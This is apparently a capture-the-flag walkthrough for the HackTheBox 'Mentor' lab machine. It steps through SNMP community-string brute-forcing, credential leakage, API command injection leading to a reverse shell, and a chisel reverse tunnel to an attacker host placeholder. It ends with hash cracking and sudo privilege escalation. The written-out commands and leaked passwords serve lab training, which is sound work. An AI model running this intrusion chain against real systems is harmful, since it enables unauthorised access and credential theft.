---
title: HTB - Mentor
author: nirajkharel
date: 2023-03-15 14:10:00 +0800
categories: [HackTheBox]
tags: [HTB, HackTheBox]
render_with_liquid: false
---

# HTB — Mentor
A detailed walkthrough for solving Mentor Box on HTB. The box contains vulnerability like information disclosure in SNMP, Command Injection, Hardcoded credentials and privilege escalation through SUDO.

<img alt="" class="bf rj rk ls" loading="eager" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*vGAsF95ycRUZf0tW8rMZ8A.png" width="700" height="517">

NMAP
----

Let’s start with an NMAP Scanning to enumerate open ports and the services running on the IP.

```bash
nmap -sC -sV -oA nmap/10.10.11.193 10.10.11.193 -v
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
|_  256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://mentorquotes.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


Add IP 10.10.11.193 on /etc/hosts file of an attacking machine and open [http://mentorquotes.htb](http://mentorquotes.htb/) on a browser. The application seems to be a kind of platform for quotes. Found noting interesting on the client side source codes.

Directory Busting
-----------------

```bash
gobuster dir -u http://mentorquotes.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```


```bash
python3 dirsearch.py -u http://mentorquotes.htb
```


Found nothing on directory bruteforcing. Let's try some subdomain enumeration. I somehow missed to take an screenshot for subdomain enumeration. But you can get the subdomains with below command.

```bash
wfuzz -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://mentorquotes.htb/" -H "Host: FUZZ.mentorquotes.htb"
```


We got to know that there is a subdomain called **api**. Lets add it on our /etc/hosts file.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*Ja9aroYXKLDAUNFKn-iEvA.png" width="700" height="208">

Navigating in a browser, we can see it is some kind of API collection but does not have anything.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*qKwK3Kq0Y9cDr4Ozas9FZA.png" width="700" height="302">

Lets enumerate if it has any directories. Some of the interesting directories

```bash
python3 dirsearch.py -u http://api.mentorquotes.htb/
# Result
[20:14:35] Starting:
[20:15:13] 307 -    0B  - /admin  ->  http://api.mentorquotes.htb/admin/
[20:15:14] 422 -  186B  - /admin/
[20:15:14] 422 -  186B  - /admin/?/login
[20:15:15] 307 -    0B  - /admin/backup/  ->  http://api.mentorquotes.htb/admin/backup
[20:15:36] 405 -   31B  - /auth/login
[20:15:53] 200 -  969B  - /docs
[20:15:53] 307 -    0B  - /docs/  ->  http://api.mentorquotes.htb/docs
[20:16:41] 403 -  285B  - /server-status
[20:16:41] 403 -  285B  - /server-status/
[20:17:01] 422 -  186B  - /users/
```


We can see the we have got 200 OK response on /docs/. Lets navigate into it on a web browser. There are multiple API endpoints on the docs section like login, signup, users and quotes.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*xnRCQlLll426f9kNNmEZdQ.png" width="700" height="458">

Lets start with a signup. Send a request and intercept a request on a burp so that it would be easy on further testing.

**Signup**

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*wJPuUb1acK5jlJhcm_ve_w.png" width="700" height="261">

**Login**

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*cveF3L04fbDikqSIRt0Sgg.png" width="700" height="226">

**Quotes**

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*vWXe1pfb503H8QBbZXD2Ew.png" width="700" height="395">

**Admin**

As we can navigate on the directory busting above, we can see there is an admin endpoint. Lets try if we can access the admin portal as well.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*AuouwSesExjtnKIlFELQyg.png" width="700" height="261">

We can see that only admin users are authorized to access the admin portal. If we view the API portal again, we can see the user james. James user might have an admin privilege. After performing brute force, we were not success on login into it.

While researching about the API pentesting on back days. I studied somewhere that we should also check if an API endpoint allows users to signup with same email for multiple users. If it allows, this vulnerability can allow an attacker to takeover into others account through various functionalities like forgot password, change password, reset password and so on.

Let’s try if we can find similar kind of vulnerabilities here.

**Signup**

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*hOPs95Ar6JftPcGtVH9fQg.png" width="700" height="251">

**Login**

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*gBqVgNHG17IHPj2k47MZgQ.png" width="700" height="224">

**Admin**

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*BOOYzFyIg4E_f_ckVMNmpg.png" width="700" height="209">

We were not successful.

Lets try if we could do same for username. Will feel lucky if it happens.

**Signup**

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*S1BNTX8Aepf8Xop7kQLmzw.png" width="700" height="234">

We can see that in above image that it is only validating email address for multiple registration. Lets see if we can login into the james account with updated credentials.

**Login**

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*fg1jSFJUjwAqPRm9mZynQw.png" width="700" height="189">

**Admin**

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*XExVz0u-bsW5kIxQJKfjCw.png" width="700" height="202">

There was a vulnerability in this box where we can re-register a user as james, and using the newly registered user, we can have admin privileges on it. Moving forward, we have command injection from where we could gain a reverse shell. But this issue was fixed and we can no longer use this approach.

New Approach
------------

I spend couple of good hours enumerating this box again since this was only the approach I knew to solve this box. I planned to start from an NMAP again. I realized that I forgot to perform UDP scan on the host. Lets start with that.

**NMAP UDP Scan**

```bash
sudo nmap -sU 10.10.11.193 -vv
# Result
Discovered open port 161/udp on 10.10.11.193
```


Here we can see that the port 161 **SNMP** is enabled which is a Simple Network Management Protocol. Lets find out if we could find any informations on it.

**SNMP Enumeration**

We can also use a tool [SNMPBrute](https://github.com/SECFORCE/SNMP-Brute) to enumerate the commuinty strings for SNMP. There might be possible ways that it could leak some credentials or any sensitive data that we need for further exploitation.

```bash
python3 snmpbrute.py -t 10.10.11.193
# Result
10.10.11.193 : 161      Version (v2c):  internal
10.10.11.193 : 161      Version (v1):   public
10.10.11.193 : 161      Version (v2c):  public
10.10.11.193 : 161      Version (v1):   public
10.10.11.193 : 161      Version (v2c):  public
```


After we find the community strings and their versions, we can use SNMPWalk to enumerate further.

```bash
snmpwalk -v '-v2c' -c internal 10.10.11.193 | tee snmpwalk.txt
```

Cat the output of snmpwalk.txt and grep for login keyword. We can find a james password in there which is _kj23sadkj123as0-d213_

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*Je0FOyzxkr_6_BVKQM5K8Q.png" width="700" height="137">

Use the email:james@mentorquotes.com, username: james and password: kj23sadkj123as0-d213 on above API login endpoint.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*dEd7ITm1sxTutcl7-sJXYA.png" width="700" height="241">

Accessing Admin API, we can discover two more API endpoints, /check and /backup.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*DVdFIjFSs-KItZQIZjIdBA.png" width="700" height="246">

Check API. Nothing interesting here.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*F6RqlWyJlUKq6VvgvYXGsA.png" width="700" height="198">

Backup API. Method not allowed.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*ya321HzJn2x0cPxToMP_Cw.png" width="700" height="230">

Lets change the method for /admin/backup API endpoint. We can see that the backup API needs some body parameter.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*y3Ao0K57xOxiSWIdtCxhzw.png" width="700" height="278">

Modify the Content-Type to application/json put empty {} on the body and send the request again. We can see the parameter needed which are _body_ and _path_.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*HynUJ6ps7xm44rL33PW4WA.png" width="700" height="308">

As shown on the below image we found valid parameter needed.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*sMwhu8Fe9uFzdt_IhEYx4w.png" width="700" height="259">

Lets try if we have any command injection on the parameters.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*w5GDmHgXnQ7yx-kcBbFmBg.png" width="700" height="329">

Since the payload does not throws any errors, there might be possible command injection on it. Lets verify it with ping.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*GvOzWMwOnTPWZ-e2e8KMkw.png" width="700" height="301">

But packets are not received.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*ZiJI-vpJBST-IgNYd14-hw.png" width="700" height="126">

Lets try to listen the packet with wireshark. I was successful. I don’t know why tcpdump was not able to capture the traffic.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*3-jw_zzJgVgtr1R4b6Giwg.png" width="700" height="281">

Since we have a confirmation about command injection. Let’s try gaining a reverse shell from it. Using the bash payload, it did not trigger the shell. Let’s try with Netcat. You can get the needed payloads with Hack-Tools browser extension.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*cIp_A2eOa6BKWh-eCMpSwQ.png" width="700" height="373">

And we gained a shell. Please note that the output of user.txt here is not a correct flag.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*SqA0xttbQy2GXAdsqCAvaA.png" width="700" height="277">

I was surprised that the output of _whomi_ command was _root_ in this box. Later on I realized that it is a docker container. We need to escalate it in order to gain a root access.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*IGRR0WBb_V3u_aRJV9FFww.png" width="700" height="143">

After some file system enumerations, I found db.py file under _/API/app/._ Viewing the content of the file db.py we can discover a postgres credentials.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*roUR-5y_Ku82aD3x64wUag.png" width="700" height="209">

Lets connect to this database using chisel since it does not have psql installed on the box. You can download the chisel from [here](https://github.com/jpillora/chisel/releases).

Download a chisel executable binary file into the box. If you want to learn more about chisel, please visit [here](https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel).

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*74zpfkkUSJqIHtPRuosZDg.png" width="700" height="227">

Start a server in an attacker machine.

```bash
chisel server --port 9001 --reverse
```


Start a client in a docker machine

```bash
chmod +x chisel
./chisel client -v <attacker-IP>:9001 R:5432:172.22.0.1:5432
```

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*OyRLGArRnWyt9PKj7UVyMg.png" width="700" height="260">

Connect to the database from an attacker machine.

```bash
psql -h 127.0.0.1 -p 5432 -d mentorquotes_db -U postgres
```

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*CWs6RUkUdClHAksLeFfEHw.png" width="700" height="165">

When this commands is executed, it forwards is traffic to the docker machine through its port 9001. Chisel client will accept the connection from an attacker machine through port 9001 and forward the traffic to its host 172.22.0.1:5432.

Enumerating the tables, we can view the password hash for svc and james user.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*YQLpkVXp22HcbsZlwXVzyA.png" width="700" height="279">

Check if the hash is available in the internet or not, which means we can check for same hash in a internet whose plaintext is available, if the hash is matched, plaintext is matched too. This can be done with [https://crackstation.net](https://crackstation.net/).

We did not find hash for james user.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*I-PB3FD7_VPACKjtREXOsA.png" width="700" height="304">

Let’s check for user svc. We are able to gain a plaintext for this user.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*HshHDxgbP4aAfDRMZixdnA.png" width="700" height="243">

In the images above, we already got a svc user access, but it was on a docker. Let’s try if we can escape from a docker to a machine using the cracked credentials through SSH. And we did.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*HlU-QFDFRnC5VN-QNEeJHQ.png" width="700" height="522">

Execute command **_ls -la /_** to check if we are on docker environment again but we did not see .dockerenv file which means we have escaped a docker environment. Also note that, we got user.txt flag from dockerize environment but it was not a correct one. We can find an actual user.txt file here.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*F_tpfCXOKJM92B1Hnk4E-g.png" width="700" height="171">

Privilege Escalation
--------------------

As shown on image below, user svc cannot run sudo commands and there is an another user on a machine, James, which we need to escalate.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*WMgkuZ0kXkTM4r8xm6k2Lg.png" width="700" height="226">

Let’s run linpeas. Download a linpeas bash script to a machine and execute it.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*WMgkuZ0kXkTM4r8xm6k2Lg.png" width="700" height="226">

We can find multiple CVEs from Linux Exploit Suggester which was I was not successful on exploitation. But we can find configuration files for SNMP here. Since we got the james password for API from SNMP, lets look if we can get something here.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*OQMejxxOM_aRB3rru9AFCw.png" width="700" height="157">

Since every user have read access on it. Opening the conf file we can see a password.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*_wWtuAO3wxCuEKdn92Y5BA.png" width="700" height="172">

Let’s try if we could login into a machine as james using above password.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*oWS7AJKYE-J9uuQUxqFqMQ.png" width="700" height="491">

Successfully logged in as james user.

**Root Access**

We can see that james is privileged to run /bin/bash as sudo and no password is required.

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*1Xxa4nuWbOKe53ztoRDXBQ.png" width="700" height="135">

<img alt="" class="bf rj rk ls" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*0J-c7tqGx7aEGuLpw9LA1g.png" width="700" height="190">

Here is your root.txt Happy Hacking!!